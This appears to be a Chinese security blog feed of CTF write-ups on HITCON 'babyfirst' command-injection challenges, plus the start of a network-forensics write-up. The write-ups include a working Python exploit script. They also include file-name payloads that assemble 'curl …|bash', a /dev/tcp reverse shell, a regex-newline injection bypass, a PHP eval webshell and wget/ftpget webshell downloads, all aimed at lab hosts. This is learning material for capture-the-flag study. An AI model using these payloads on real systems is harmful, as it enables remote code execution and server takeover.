class="line"><span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g"</span></span><br><span class="line"> <span class="string">'&gt;rev'</span>,</span><br><span class="line"> <span class="string">'*v&gt;x'</span>, </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "curl orange.tw|python;"</span></span><br><span class="line"> <span class="comment"># generate "curl 10.188.2.20|bash" </span></span><br><span class="line"><span class="string">'&gt;\;\\'</span>,</span><br><span class="line"> <span class="string">'&gt;sh\\'</span>, </span><br><span class="line"><span class="string">'&gt;ba\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\|\\'</span>,</span><br><span class="line"> <span class="string">'&gt;20\\'</span>,</span><br><span class="line"> <span class="string">'&gt;2.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;8.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;18\\'</span>,</span><br><span class="line"> <span class="string">'&gt;0.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;1\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\ \\'</span>,</span><br><span class="line"> <span class="string">'&gt;rl\\'</span>,</span><br><span class="line"> <span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line"> <span class="comment"># got shell</span></span><br><span class="line"> <span class="string">'sh x'</span>, </span><br><span class="line"><span class="string">'sh g'</span>,</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><p>首先第一个知识点就是Linux下存在<code>dir</code>命令作为<code>ls</code>命令的别名，可能有的系统没有，但是对于这道题而言是有的，而且他也是默认以字典序去排列，对于这题而言这个命令起到了拼接文件名的效果，但是注意含有特殊字符以及数字的情况下，字母排序的优先级会降低<br><img src="https://s1.ax1x.com/2018/09/18/ietTMt.png" alt="ietTMt.png"></p><p>第二个点在于单独一个<code>*</code>的命令有何作用，这个命令会先将当前目录下所有的文件进行一个排序，然后排序后的结果会以命令的形式送去<code>bash</code>执行，如下图，但是如果有写不是命令的话就会出现<code>command not found</code>的报错，这样一来我们就可一利用<code>dir</code>加上<code>*</code>命令去执行写入文件的操作，这也是这道题目关键之处，利用了逆序执行命令的骚操作，这得对Linux系统多么熟悉啊<br><img src="https://s1.ax1x.com/2018/09/18/iet7sP.png" alt="iet7sP.png"></p><p>接着上就提出下一个知识点，就是利用<code>rev</code>命令去反向文件的字符串，顾名思义，我们就是要把<code>ls -t &gt;g</code>这一条命令给逆序过来，这操作很强。这也是为什么要先构造下图中的文件名，你逆序过来就会发现是<code>ls -th &gt;g</code></p><p><img src="https://s1.ax1x.com/2018/09/18/ietHqf.png" alt="ietHqf.png"><br>有人可能会问为什么会多加一个<code>h</code>，因为如果不多加<code>h</code>的话在你执行<code>dir</code>的时候按字母排序字母<code>t</code>比<code>s</code>更靠后，放进<code>v</code>文件之后以及放入想文件里面是这样的，这就跟我们的目的相违背，不能构造出<code>ls -t &gt;g</code>了，但是我们构造的是<code>ls  -th &gt;g</code>情况就会有所改观，这个<code>h</code>实际上没有影响，就是一个改变视图结构的东西，把内存大小变得更加人性化而已。<br><img src="https://s1.ax1x.com/2018/09/18/ietqZ8.png" alt="ietqZ8.png"></p><p><img src="https://s1.ax1x.com/2018/09/18/ietLdS.png" alt="ietLdS.png"></p><p>按照上面所说把<code>v</code>文件的内容弄好，下面就应该创建一个<code>rev</code>的文件，为的是利用这个命令，通过<code>*v&gt;x</code>的方式把逆序后的内容放在x文件里面，到后期可以直接sh执行，<code>*v&gt;x</code>这个命令的含义就是将所有最后一个字母都是<code>v</code>的文件排个序，然后执行，因为r在v的前面实际上的命令就是 <code>rev v&gt;x</code>，所以最后到<code>x</code>文件里面的内容就是<br><img src="https://s1.ax1x.com/2018/09/18/ietjiQ.png" alt="ietjiQ.png"></p><p>到这里就跟第一个babyfirst-revenge一样了，后续步骤就不多说了,直接上EXP获取flag2333</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.第一个利用的点是逆序字符串放入文件中在执行，如果让我来想我是绝对想不到的，学习了<br>2.第二个就是利用了<code>dir</code>命令完美滴绕过了<code>ls&gt;&gt;x</code>这个限制<br>3.Linux下<code>*</code>命令巧妙使用</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个题目的条件更加苛刻了，先放个源码
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2015 babyfirst复现</title>
    <link href="0verwatch.top/2018/09/14/hitcon2015-babyfirst/"/>
    <id>0verwatch.top/2018/09/14/hitcon2015-babyfirst/</id>
    <published>2018-09-14T09:10:41.000Z</published>
    <updated>2018-09-14T09:25:54.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续上面的题目，直接利用上一道题目的docker环境复现一道题目<a id="more"></a>，注意这里面的docker环境可能需要自己在某些文件夹下面设置权限，自己缺点什么环境就自己下就行了，感觉这个题目的难度比较上一题低了一点，参考博客: <a href="https://blog.spoock.com/2017/09/09/Babyfirst-writeup/" target="_blank" rel="noopener">https://blog.spoock.com/2017/09/09/Babyfirst-writeup/</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先放个题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">'sandbox/'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !file_exists($dir) )</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    chdir($dir);</span><br><span class="line"></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) )</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    exec(<span class="string">"/bin/orange "</span> . implode(<span class="string">" "</span>, $args));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一段代码的意思就是建立一个<code>sandbox/clientip</code>文件夹 ，然后利用通过get法师获取args的参数，然后里面有一个正则匹配，只能通过的是数字以及字母不然的话就会直接die掉，最后就是利用exec这个执行函数了，而/bin/orange最终发现只是/bin/true的软链接，没有任何的作用。</p><p>这个题目关键是那个正则，那个正则在很多题目也有见到过，由于preg_match()使用的是\w来进行检查，所有的斜线、破折号和点<code>(\,-,.)</code>都无法使用。另外就是在<code>/^\w+$\</code>中的<code>$</code>当遇到一个字符串的结尾是换行符时还是可以匹配的。利用这个特性，就可以绕过前面的<code>preg_match()</code>检查，同时多出的换行符还可以在<code>exec()</code>函数中执行。</p><p>个人感觉这个题目如果<code>implode</code>里面的分割用的不是空格而是其他的类似逗号的东西这一个题目不一定可以写文件，或许其他大佬有办法可以跟我讲讲。留了空格刚好就可以写文件了</p><p>比如传参的url是这样的<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=touch&amp;args[]=0ver</code><br>这三个参数都可以经过正则匹配<br>那么执行的过程就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/orange xxx</span><br><span class="line">touch test</span><br></pre></td></tr></table></figure><p>可以成功创建文件<br><img src="https://s1.ax1x.com/2018/09/14/iEgrQg.png" alt="iEgrQg.png"><br>这样一来，就先了正则，然后既可以创建文件了，如果implode里面不用空格分割的话，后面创建文件就会变成<code>touchtest</code>，这种东西是不可以创建文件的 </p><p>然后这里就是参考了大佬们的做法利用<code>wget</code>的方式去实现，tql</p><p>这里牵涉到另外一个知识点，我们平常见到的ip地址都是点分十进制表示的，其实IP地址还可以用直接10进制，八进制等等表示都可以</p><p>然后再开一个本地环境:192.168.1.106，服务器:192.168.1.102</p><p>在本地里面创建一个页面index.php内容为<code>&lt;?php phpinfo();?&gt;</code><br><a href="https://imgchr.com/i/iEgfYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgfYV.md.png" alt="iEgfYV.md.png"></a></p><p>然后再往服务器发送相应的参数，这时候的ip地址转化就起作用了，把本地ip换一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">"%u"</span>, ip2long(<span class="string">"192.168.1.106"</span>));</span><br></pre></td></tr></table></figure><p>得到输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3232235882</span><br></pre></td></tr></table></figure></p><p>这里用的这样的输出方法是为了解决32位以及64位php版本的问题，因为由于自己的php版本是32 位的输出的是负数，所以才用这样的的解决方法，参考链接<br><a href="https://blog.csdn.net/everything1209/article/details/22418559" target="_blank" rel="noopener">https://blog.csdn.net/everything1209/article/details/22418559</a></p><p>这时候就是开始利用了<br><code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=wget&amp;args[]=3232235882</code><br>然后就直接把192.168.1.106主页的页面给下载下来，但是这个页面是解析过了的，没有任何PHP语言的痕迹，只剩下html了<br><a href="https://imgchr.com/i/iEgIlF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgIlF.md.png" alt="iEgIlF.md.png"></a></p><p>这时候又是另外一个知识点了<br>在Linux中PHP能够执行非压缩的打包的PHP文件。<br>也就是这样的过程<br>创建1.php，内容为<code>&lt;?php echo &quot;123&quot;;?&gt;</code>，通过<code>tar</code>将<code>1.php</code>打包,<code>tar cvf test 1.php</code>，PHP运行test文件，可以运行<br><a href="https://imgchr.com/i/iEgHm9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgHm9.md.png" alt="iEgHm9.md.png"></a></p><p>复现到这里，发现orange大佬真是强，到后期就是利用上面两个知识点</p><p>在原来的本地的index.html里面改成这样的代码，注意一定要在<code>index.html</code>里面写上这样的语句，不然的话就会在像上面的例子一样在<code>index.php</code>里面的语句会被解析之后下载，会毫无用处下载下来是没有php语句的，更别谈解析了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'cmd.php'</span>, <span class="string">'</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">header("Content-Type: text/plain");</span></span><br><span class="line"><span class="string"> @eval($_POST["cmd"]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'</span>);</span><br></pre></td></tr></table></figure><p>然后开始写webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=mkdir&amp;args[]=exploit 创建exploit文件夹</span><br><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=cd&amp;args[]=exploit%0a&amp;args[]=wget&amp;args[]=3232275969   进入exploit文件夹，下载192.168.158.1的index.html文件。</span><br></pre></td></tr></table></figure><p>然后就是利用打包的方式去执行相关的PHP代码了，想直接改名字是不可能的因为命令里面含有<code>&#39;.&#39;</code>这样的字符<br>再来一句<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=php&amp;args[]=cmd</code> 执行一波这个打包未压缩的PHP文件</p><p>然后可以执行一句话木马了，打开小马页面<code>http://192.168.1.102/sandbox/192.168.1.102/cmd.php</code>，上菜刀链接成功<br><a href="https://imgchr.com/i/iE2S6e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iE2S6e.md.png" alt="iE2S6e.md.png"></a></p><p>再看一下服务器下面的目录成功创建了<code>cmd.php</code>页面<br><img src="https://s1.ax1x.com/2018/09/14/iE2Kmj.png" alt="iE2Kmj.png"></p><p>再看看出题人的官方wp发现还有其他骚操作<br>就是利用一波<code>ftp</code>方式去下载远程的一句话木马，因为自己虚拟机没有<code>busybox</code>这个东西就不搞了<br>但还是得过一遍脑紫的，利用下面的命令把远处<code>ftp</code>服务器里面的<code>webshell.php</code>给下载下来，这样做的好处就是不用再管原来那些php繁琐的解析步骤，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox ftpget -u ftp的用户名 -p ftp的密码 ftp地址 需要下载的文件名</span><br></pre></td></tr></table></figure><p>很好的思路学习了，不一定就是busybox，还有其他利用ftp的下载功能来获取webshell的。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.两个运用的知识点远程wget下载的PHP文件是经过解析的，服务器是可以通过用php执行打包的文件的，注意不是压缩的PHP文件，有点像是两个本来安全的东西放在一起后就变成了不安全的东西。。。。个人感觉问题的严重性还是出现在php能够执行未压缩的打包文件上。<br>2根据上一次的复现题目，个人感觉命令执行在这两道题目的上面都利用了远程的另外一台主机，第一次是使用了curl命令去访问，而这次是通过wget或者是ftp去访问，骚操作又学习了一波<br>3.正则可以换行符继续匹配那个点就不多说了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;继续上面的题目，直接利用上一道题目的docker环境复现一道题目
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2017 babyfirst-revenge复现</title>
    <link href="0verwatch.top/2018/09/06/hitcon2017-babyfirst/"/>
    <id>0verwatch.top/2018/09/06/hitcon2017-babyfirst/</id>
    <published>2018-09-06T09:30:36.000Z</published>
    <updated>2018-09-14T09:25:06.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯<a id="more"></a>emmm</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先从Hitcon2017 babyfirst-revenge这一个题目，总结一下还是学到很多东西的<br>复现地址 <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p><p>这是题目回显的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个源码的意思就是会自动创建一个<code>/www/sandbox/</code>然后在下面新建文件夹，然后可以通过<code>cmd</code>参数去执行相关系统命令，但是这个系统命令的长度是会有限制的，这题的关键在于要绕过这个长度以及如何去构造<code>getshell</code>的命令。<br>突然发现P神就是很早就有类似文章，我还是太菜，得拼命学习啊<br><a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a></p><h4 id="知识点一"><a href="#知识点一" class="headerlink" title="知识点一"></a>知识点一</h4><p>在Linux下面可以通过换行去执行断断续续的命令，例如<br><img src="https://s1.ax1x.com/2018/09/06/iCZyI1.png" alt="iCZyI1.png"></p><h4 id="知识点二"><a href="#知识点二" class="headerlink" title="知识点二"></a>知识点二</h4><p>在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过<code>sh filename</code>来执行文本里面的系统命令，如果有报错的话会自动跳过<br>如<br><a href="https://imgchr.com/i/iCZgG6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCZgG6.md.png" alt="iCZgG6.md.png"></a></p><h4 id="知识点三"><a href="#知识点三" class="headerlink" title="知识点三"></a>知识点三</h4><p>我们可以通过&gt;+fileanme来实现新建一个文件，注意区别一下<code>&gt;</code>和<code>&gt;&gt;</code>这两个符号<br>小于号：命令默认从键盘获得的输入，改成从文件，或者其它打开文件以及设备输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; 是追加内容</span><br><span class="line">&gt; 是覆盖原有内容</span><br></pre></td></tr></table></figure><p>后面会有这里的详细利用</p><p>这样就可以运用这两个知识点去实现这段代码的绕过<br>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p><p>这里面注意两个点<br>第一点<code>ls</code>命令列文件的顺序，通过php执行的ls命令以及直接在linux下执行的ls命令是不一样的，因为我们一开始的输入是从php里面开始的<br>ls 的默认排序方式手册上只写了是<code>alphabetically</code>（字典序），经过测试发现ls排序方式是忽视字母大小写，数字排在字母前面，无视数字和英文字母之外的字符。<br>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a><br><img src="https://s1.ax1x.com/2018/09/06/iCetwd.png" alt="iCetwd.png"></p><p>所以还是按照官方wp那样通过追加方式去添加内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&gt;ls\\'</span>, </span><br><span class="line"> <span class="string">'ls&gt;_'</span>, </span><br><span class="line"> <span class="string">'&gt;\ \\'</span>, </span><br><span class="line"> <span class="string">'&gt;-t\\'</span>, </span><br><span class="line"> <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line"> <span class="string">'ls&gt;&gt;_'</span>,</span><br></pre></td></tr></table></figure><p>就是为了拼凑出<code>ls -t&gt;g</code>，这是为了后面构造<code>curl 192.168.1.104|bash</code> 做好准备，我们就可以通过时间的先后顺序把curl命令完整的拼接</p><p>第二点我们是通过构造文件名，然后通过<code>ls</code>命令将文件名写入到另外一个文件里面去然后执行，这里面要注意转义符号<code>\</code>(反斜杠)不要忘记</p><p>然后我们在自己的vps上先写好反弹webshell的话<br><a href="https://imgchr.com/i/iCeaFI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeaFI.md.png" alt="iCeaFI.md.png"></a></p><p>开始监听端口<br><img src="https://s1.ax1x.com/2018/09/06/iCeBSf.png" alt="iCeBSf.png"></p><p>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash` </span></span><br><span class="line">    <span class="string">'&gt;sh\ '</span>, </span><br><span class="line">    <span class="string">'&gt;ba\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;6\\'</span>,  </span><br><span class="line">    <span class="string">'&gt;10\\'</span>,</span><br><span class="line">    <span class="string">'&gt;1.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;8.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;16\\'</span>, </span><br><span class="line">    <span class="string">'&gt;2.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;19\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://192.168.1.104:49200//?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">'http://192.168.1.104:49200//?cmd='</span> + quote(i) )</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><p>反弹webshell成功<br>然后在<code>/home</code>目录下发现有关flag的东西，应该是在数据库里面<br>连接一下<br><img src="https://s1.ax1x.com/2018/09/06/iCeDl8.png" alt="iCeDl8.png"><br>交互性极差，每次都要exit一下才有回显，也是服气。。。但最后还是得到flag了<br><a href="https://imgchr.com/i/iCer6S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCer6S.md.png" alt="iCer6S.md.png"></a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实这个题目还有其他骚操作，比如用利用<code>wget</code>，以及直接构造一个比较骚气的域名。。这域名搞不来，我就没有尝试了，至于wget方法的话下次复现一下2015年的babyfirst在尝试一下<br>小结一波，这个题目收获很大，先来讲这个东西其实是关乎对Linux系统各种缩小版米昂领的熟悉程度，比如怎样能快速新建文件这里就用了&gt;这个符号去创建，还有通过管道符去执行bash命令(这一点就可以继续去推行还可以使用python，php一系列的命令结合各种语言反弹webshell的操作)，这都是我想不到的东西，归根到底是学的东西还是不能够灵活使用<br>顺便吐槽一下，最近的算法课懵逼得很，全都跟高数的级数收敛还有泰勒展开扯上关系，突然恐惧，还得重新用C++写oj上的算法题目，都是些大佬。。我做完的时候他们都不知道ak多久了。。。<br><a href="https://imgchr.com/i/iCeb79" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeb79.md.png" alt="iCeb79.md.png"></a></p><p>恐怕9月份难熬23333.。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>铁三2018.5.5数据分析</title>
    <link href="0verwatch.top/2018/09/06/liuliangfenxi-5-5/"/>
    <id>0verwatch.top/2018/09/06/liuliangfenxi-5-5/</id>
    <published>2018-09-06T09:30:21.000Z</published>
    <updated>2018-09-06T09:53:58.882Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>keep learning</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>链接: <a href="https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ</a> 密码: nux4<br>感谢方方土学长的<a href="http://skysec.top/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" target="_blank" rel="noopener">题解</a>，学习到<a id="more"></a>了一定的套路</p><p>题目描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.黑客攻击的第一个受害主机的网卡IP地址</span><br><span class="line">2.黑客对URL的哪一个参数实施了SQL注入</span><br><span class="line">3.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)</span><br><span class="line">4.第一个受害主机网站数据库的名字</span><br><span class="line">5.Joomla后台管理员的密码是多少</span><br><span class="line">6.黑客第一次获得的php木马的密码是什么</span><br><span class="line">7.黑客第二次上传php木马是什么时间</span><br><span class="line">8.第二次上传的木马通过HTTP协议中的哪个头传递数据</span><br><span class="line">9.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)</span><br><span class="line">10.php代理第一次被使用时最先连接了哪个IP地址</span><br><span class="line">11.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候</span><br><span class="line">12.黑客在内网主机中添加的用户名和密码是多少</span><br><span class="line">13.黑客从内网服务器中下载下来的文件名</span><br></pre></td></tr></table></figure><p>先看看这些包都是按时间顺序命名的<br><img src="https://s1.ax1x.com/2018/09/06/iCAIZn.png" alt="iCAIZn.png"><br>先打开第一个包<br>一般黑客攻击先从应用层发起攻击，所以先过滤<code>http</code>看一下<br>发现ip为<code>202.1.1.2</code>对<code>192.168.1.8</code>有很明显的爆破痕迹，把里面的url的内容urldecode一下会发现明显的sql查询语句，而且有很明显sqlmap指纹痕迹<br><img src="https://s1.ax1x.com/2018/09/06/iCAbGT.png" alt="iCAbGT.png"></p><p>所以就解决了受害主机ip是<code>192.168.1.8</code><br>我们再详细过滤一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and ip.src == 202.1.1.2</span><br></pre></td></tr></table></figure><p>可以得到比较详细的爆破过程，标记一下最后一个，然后返回http查看他的response<br><a href="https://imgchr.com/i/iCAqRU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCAqRU.md.png" 